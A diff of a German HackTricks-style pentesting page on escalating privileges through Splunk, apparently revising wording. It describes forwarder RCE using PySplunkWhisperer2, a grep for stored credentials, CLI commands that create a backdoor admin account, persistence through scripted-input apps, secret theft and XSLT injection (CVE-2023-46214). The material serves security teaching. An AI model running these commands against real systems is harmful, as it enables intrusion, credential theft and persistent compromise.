@@ -2,15 +2,15 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Wenn du bei der **internen** oder **externen Enumeration** einer Maschine **Splunk running** vorfindest (normalerweise **8000** für die Web UI und **8089** für die Management API), können gültige Credentials häufig durch die Installation von Apps, scripted inputs oder Management-Aktionen in **code execution** umgewandelt werden. Wenn Splunk als **root** läuft, führt das häufig unmittelbar zu einer **privilege escalation**.
+Wenn du bei der **internen** oder **externen Enumeration** einer Maschine **Splunk running** findest (gewöhnlich **8000** für die Weboberfläche und **8089** für die Management API), können gültige Credentials häufig durch die Installation von Apps, scripted inputs oder Management-Aktionen in **code execution** umgewandelt werden. Wenn Splunk als **root** läuft, führt das häufig unmittelbar zu **privilege escalation**.
 
-Wenn du nur die allgemeine Remote-Angriffsfläche, Enumeration oder den App-Upload-RCE-Pfad benötigst, siehe:
+Wenn du nur die generische Remote-Angriffsfläche, Enumeration oder den App-Upload-RCE-Pfad benötigst, siehe:
 
 {{#ref}}
 ../../network-services-pentesting/8089-splunkd.md
 {{#endref}}
 
-Wenn du **bereits root** bist und der Splunk-Service nicht ausschließlich auf localhost lauscht, kannst du außerdem **Splunk password hashes** stehlen, **encrypted secrets** wiederherstellen oder eine **malicious app** bereitstellen, um lokal oder über mehrere Forwarder hinweg Persistence aufrechtzuerhalten.
+Wenn du **bereits root** bist und der Splunk-Service nicht ausschließlich auf localhost lauscht, kannst du außerdem **Splunk password hashes** stehlen, **encrypted secrets** wiederherstellen oder eine **malicious app** pushen, um lokal oder über mehrere Forwarder hinweg Persistence aufrechtzuerhalten.
 
 ## Interessante lokale Dateien
 
@@ -26,35 +26,35 @@ grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLU
 Wichtige Artefakte:
 
 - **`$SPLUNK_HOME/etc/passwd`**: lokale Splunk-Benutzer und Passwort-Hashes.
-- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: Schlüssel, den Splunk zum Verschlüsseln von Secrets verwendet, die in mehreren `.conf`-Dateien gespeichert sind.
-- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: initiale Admin-Bootstrap-Datei; nützlich bei Gold Images und Provisioning-Fehlern. Sie wird ignoriert, wenn `etc/passwd` bereits existiert.
-- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: Ort, an dem scripted inputs üblicherweise aktiviert werden.
-- **`$SPLUNK_HOME/etc/deployment-apps/`** oder **`$SPLUNK_HOME/etc/apps/`**: gute Orte, um eine persistente App zu verstecken oder zu überprüfen, was bereits verteilt wird.
+- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: Schlüssel, den Splunk zur Verschlüsselung von Secrets verwendet, die in mehreren `.conf`-Dateien gespeichert sind.
+- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: Bootstrap-Datei für den initialen Admin; nützlich bei Golden Images und Provisioning-Fehlern. Sie wird ignoriert, wenn `etc/passwd` bereits vorhanden ist.
+- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: Hier werden scripted inputs häufig aktiviert.
+- **`$SPLUNK_HOME/etc/deployment-apps/`** oder **`$SPLUNK_HOME/etc/apps/`**: Gute Orte, um eine persistente App zu verstecken oder zu überprüfen, was bereits verteilt wird.
 
-## Splunk Universal Forwarder Agent Exploit-Zusammenfassung
+## Splunk Universal Forwarder Agent Exploit Summary
 
-Weitere Details finden sich unter [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dies ist lediglich eine Zusammenfassung:
+Weitere Details findest du unter [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dies ist nur eine Zusammenfassung:<sup>[[1]](#references)</sup>
 
 **Exploit-Überblick:**
 Ein Exploit gegen den Splunk Universal Forwarder (UF) ermöglicht es Angreifern mit dem **Agent-Passwort**, beliebigen Code auf Systemen auszuführen, auf denen der Agent läuft, und dadurch potenziell einen großen Teil der Umgebung zu kompromittieren.
 
 **Warum es funktioniert:**
 
-- Der Management-Service des UF ist üblicherweise auf **TCP 8089** erreichbar.
-- Angreifer können sich bei der API authentifizieren und den Forwarder anweisen, ein **bösartiges App-Bundle** zu installieren.
+- Der Management-Service des UF ist häufig auf **TCP 8089** erreichbar.
+- Angreifer können sich an der API authentifizieren und den Forwarder anweisen, ein **malicious app bundle** zu installieren.
 - Dieselbe Primitive kann lokal für **LPE** oder remote für **RCE** verwendet werden.
-- Öffentlich verfügbare Tools wie **SplunkWhisperer2** erstellen das App-Bundle automatisch und können Payloads für Linux-Ziele anpassen.
+- Public Tooling wie **SplunkWhisperer2** erstellt das App-Bundle automatisch und kann Payloads für Linux-Ziele anpassen.
 
-**Übliche Möglichkeiten, das Passwort wiederherzustellen:**
+**Häufige Möglichkeiten, das Passwort wiederherzustellen:**
 
-- Klartext-Credentials in Dokumentation, Scripts, Shares oder Deployment-Automatisierung.
+- Klartext-Credentials in Dokumentationen, Scripts, Shares oder Deployment-Automatisierung.
 - Passwort-Hashes in `$SPLUNK_HOME/etc/passwd`, gefolgt von Offline-Cracking.
-- Golden Images oder Provisioning-Überbleibsel wie `user-seed.conf`.
+- Golden Images oder Provisioning-Überreste wie `user-seed.conf`.
 
 **Auswirkungen:**
 
-- Codeausführung auf SYSTEM-/root-Ebene auf jedem kompromittierten Host.
-- Bereitstellung persistenter Apps, Backdoors oder Ransomware.
+- Code-Ausführung auf SYSTEM-/Root-Ebene auf jedem kompromittierten Host.
+- Deployment persistenter Apps, Backdoors oder Ransomware.
 - Deaktivierung oder Manipulation der Telemetrie, bevor die Daten weitergeleitet werden.
 
 **Beispielbefehl für die Ausnutzung:**
@@ -67,9 +67,9 @@ for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8
 - [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
 - [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)
 
-## Persistence via Scripted Inputs or Malicious Apps
+## Persistenz über Scripted Inputs oder bösartige Apps
 
-Wenn du **Schreibzugriff auf das Dateisystem** als `root`/`splunk` oder authentifizierten Zugriff zum Installieren von Apps hast, ist das Ablegen einer **custom app** mit einem **scripted input** ein sehr zuverlässiger Persistence-Mechanismus. Splunks eigene Dokumentation erwartet, dass sich scripted inputs innerhalb eines App-Verzeichnisses befinden und über `inputs.conf` aktiviert werden.
+Wenn du **Dateisystem-Schreibzugriff** als `root`/`splunk` oder authentifizierten Zugriff zum Installieren von Apps hast, ist das Ablegen einer **benutzerdefinierten App** mit einem **scripted input** ein sehr zuverlässiger Persistenzmechanismus.<sup>[[2]](#references)</sup> Die eigene Dokumentation von Splunk erwartet, dass sich scripted inputs in einem App-Verzeichnis befinden und über `inputs.conf` aktiviert werden.
 
 Typischer Aufbau:
 ```bash
@@ -96,66 +96,69 @@ chmod +x "$APP/bin/check.sh"
 Notizen:
 
 - Derselbe Trick funktioniert auch mit **Universal Forwarder** unter `/opt/splunkforwarder/etc/apps/`.
-- Angreifer versuchen oft, unauffällig zu bleiben, indem sie ein legitimes Add-on modifizieren, anstatt eine offensichtlich bösartige App zu erstellen.
-- Auf einem **deployment server** führt das Platzieren einer bösartigen App in `deployment-apps/` zu **fleet-wide persistence**, da Forwarder regelmäßig aktualisierte Apps abfragen und herunterladen und häufig neu starten, um sie anzuwenden.
+- Angreifer tarnen sich häufig, indem sie ein legitimes Add-on ändern, anstatt eine offensichtlich bösartige App zu erstellen.
+- Auf einem **deployment server** führt das Platzieren einer bösartigen App in `deployment-apps/` zu **flottenweiter Persistenz**, da Forwarder regelmäßig nachfragen, aktualisierte Apps herunterladen und häufig neu starten, um sie anzuwenden.
 
-## Diebstahl von Zugangsdaten und Übernahme von Admin-Konten
+## Diebstahl von Zugangsdaten und Übernahme von Administratorkonten
 
-Wenn du Splunks lokale Dateien lesen kannst, gibt es normalerweise zwei lohnende Ziele: **Splunk-Admin-Zugriff** wiederherstellen und **verschlüsselte Service-Zugangsdaten** wiederherstellen.
+Wenn du die lokalen Dateien von Splunk lesen kannst, gibt es normalerweise zwei gute Ziele: **Splunk-Administrat Zugriff** wiederherstellen und **verschlüsselte Dienstanmeldedaten** wiederherstellen.
 
 ### Passwort-Hashes und lokale Benutzer
 
-Splunk speichert lokale Authentifizierungsdaten in `etc/passwd`. Je nach Deployment kann das Cracken dieser Datei funktionierende Zugangsdaten für die Web-UI und die Management-API liefern.
+Splunk speichert lokale Authentifizierungsdaten in `etc/passwd`. Je nach Deployment kann das Knacken dieser Datei gültige Zugangsdaten für die Weboberfläche und die Management-API liefern.
 
-Wenn du bereits über gültige **admin**-Zugangsdaten verfügst und Splunk das **native** Authentifizierungs-Backend verwendet, kann die CLI selbst für persistence genutzt werden:
+Wenn du bereits über gültige **admin**-Zugangsdaten verfügst und Splunk das **native** Authentifizierungs-Backend verwendet, kann die CLI selbst für Persistenz genutzt werden:
 ```bash
 "$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
 "$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
 ```
 ### `splunk.secret` und verschlüsselte Werte
 
-Splunk verwendet `etc/auth/splunk.secret`, um sensible Werte zu schützen, die in mehreren Konfigurationsdateien gespeichert sind. Wenn du sowohl das **secret** als auch die relevanten **`.conf`-Dateien** stehlen kannst, kannst du häufig Folgendes wiederherstellen oder erneut verwenden:
+Splunk verwendet `etc/auth/splunk.secret`, um vertrauliche Werte zu schützen, die in mehreren Konfigurationsdateien gespeichert sind. Wenn du sowohl das **Secret** als auch die relevanten **`.conf`-Dateien** stehlen kannst, kannst du häufig Folgendes wiederherstellen oder erneut verwenden:
 
-- gemeinsame Secrets von forwarder/indexer wie `pass4SymmKey`
-- Passwörter für TLS private keys wie `sslPassword`
+- gemeinsame Secrets von Forwarder/Indexer wie `pass4SymmKey`
+- Passwörter für TLS-Private-Keys wie `sslPassword`
 - LDAP-Bind-Credentials wie `bindDNPassword`
 
-Dies ist für **lateral movement** nützlich, selbst wenn das Splunk-Admin-Passwort selbst nicht crackbar ist.
+Dies ist für **laterale Bewegungen** nützlich, selbst wenn das Splunk-Admin-Passwort selbst nicht crackbar ist.
 
-### Abuse von `user-seed.conf`
+### Missbrauch von `user-seed.conf`
 
-`user-seed.conf` wird nur beim ersten Start oder wenn `etc/passwd` nicht existiert verwendet. Dadurch ist die Datei auf einem laufenden System weniger nützlich, aber sehr interessant bei:
+`user-seed.conf` wird nur beim ersten Start oder wenn `etc/passwd` nicht existiert verarbeitet. Dadurch ist die Datei auf einem laufenden System weniger nützlich, aber besonders interessant bei:
 
-- kompromittierten Installationstemplates
+- kompromittierten Installationsvorlagen
 - Container-Images
-- unattended provisioning workflows
-- Appliances, auf denen Splunk automatisch reinitialisiert wird
+- automatisierten Provisioning-Workflows
+- Appliances, auf denen Splunk automatisch neu initialisiert wird
 
-In diesen Fällen verschafft dir das Platzieren eines mit `splunk hash-passwd` generierten `HASHED_PASSWORD` eine unauffällige Möglichkeit, nach einer erneuten Bereitstellung wieder Admin-Zugriff zu erlangen.
+In diesen Fällen ermöglicht das Einfügen eines mit `splunk hash-passwd` erzeugten `HASHED_PASSWORD` einen unauffälligen Weg, nach einer erneuten Bereitstellung wieder Admin-Zugriff zu erhalten.
 
-## Abuse von Splunk Queries
+## Missbrauch von Splunk Queries
 
-Weitere Details findest du unter [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).
+Weitere Informationen findest du unter [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>
 
-Eine nützliche aktuelle Technik besteht darin, **user-supplied XSLT** in verwundbaren Splunk-Enterprise-Versionen zu missbrauchen, um einen authentifizierten Account mit niedrigen Berechtigungen in **OS command execution** als Benutzer `splunk` umzuwandeln.
+Eine nützliche aktuelle Technik besteht darin, **vom Benutzer bereitgestelltes XSLT** in anfälligen Splunk-Enterprise-Versionen zu missbrauchen, um einen authentifizierten Account mit geringen Rechten in **OS command execution** als Benutzer `splunk` umzuwandeln.
 
 Ablauf auf hoher Ebene:
 
-1. Authentifiziere dich bei Splunk.
-2. Lade eine bösartige **XSL**-Datei über die Preview-/Upload-Funktionalität hoch.
-3. Bringe Splunk dazu, Suchergebnisse mit diesem hochgeladenen Stylesheet aus dem **dispatch**-Verzeichnis zu rendern.
-4. Verwende den XSLT-Payload, um eine Datei zu schreiben oder über Splunks Search-Pipeline eine Ausführung auszulösen (beispielsweise durch den Zugriff auf interne Funktionalität wie `runshellscript`).
+1. Bei Splunk authentifizieren.
+2. Eine schädliche **XSL**-Datei über die Preview-/Upload-Funktion hochladen.
+3. Splunk dazu bringen, Suchergebnisse mit diesem hochgeladenen Stylesheet aus dem **dispatch**-Verzeichnis zu rendern.
+4. Die XSLT-Payload verwenden, um eine Datei zu schreiben oder über Splunks Search-Pipeline eine Ausführung auszulösen, beispielsweise durch das Erreichen interner Funktionen wie `runshellscript`.
 
-Die wichtigste offensive Erkenntnis ist, dass dieser Weg **post-auth RCE ohne app upload** ermöglicht. Unter Linux erhältst du normalerweise Zugriff auf den Account **`splunk`**, was dennoch wertvoll ist, da dieser Benutzer häufig den Application-Tree besitzt, Secrets lesen und persistente Apps platzieren kann, die auch nach dem Verlust der Shell bestehen bleiben.
+Die wichtige offensive Erkenntnis ist, dass dieser Weg **post-auth RCE ohne app upload** ermöglicht. Unter Linux landet man normalerweise im Account **`splunk`**, was dennoch wertvoll ist, da dieser Benutzer häufig Eigentümer des Application Trees ist, Secrets lesen kann und persistente Apps platzieren kann, die den Verlust der Shell überdauern.
 
 Ein repräsentativer Pfad, der während der Exploitation verwendet wird, ist:
 ```text
 /opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
 ```
-Wenn Splunk mit zu vielen Berechtigungen ausgeführt wird oder der Benutzer `splunk` Zugriff auf gefährliche Skripte, beschreibbare Service-Units oder fehlerhafte `sudo`-Regeln hat, entsteht daraus eine saubere **LPE**-Kette.
+Wenn Splunk mit zu vielen Berechtigungen ausgeführt wird oder der `splunk`-Benutzer Zugriff auf gefährliche Skripte, beschreibbare Service-Units oder unsichere `sudo`-Regeln hat, entsteht daraus eine saubere **LPE**-Chain.
 
 ## Referenzen
 
-- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
-- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
+- [1] [Splunk Forwarders für RCE und Persistence missbrauchen](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
+- [2] [Vorsicht vor TraitorWare: Splunk für Persistence verwenden](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
+- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
+- [4] [Analyse von CVE-2023-46214: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
+
 {{#include ../../banners/hacktricks-training.md}}
